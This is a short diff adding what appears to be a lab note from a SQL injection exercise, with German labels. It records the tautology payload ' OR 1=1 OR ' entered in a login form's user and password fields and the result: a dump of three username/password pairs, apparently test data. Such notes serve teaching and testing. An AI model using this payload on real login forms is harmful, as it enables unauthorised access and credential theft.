@@ -1,0 +1,10 @@
+user:
+	user1' OR 1=1 OR '
+pass:	
+	' OR 1=1 OR '
+
+
+Ergebnis:
+	user1	pass1
+	Hans	Giebenrath
+	peter	fkljdbfd
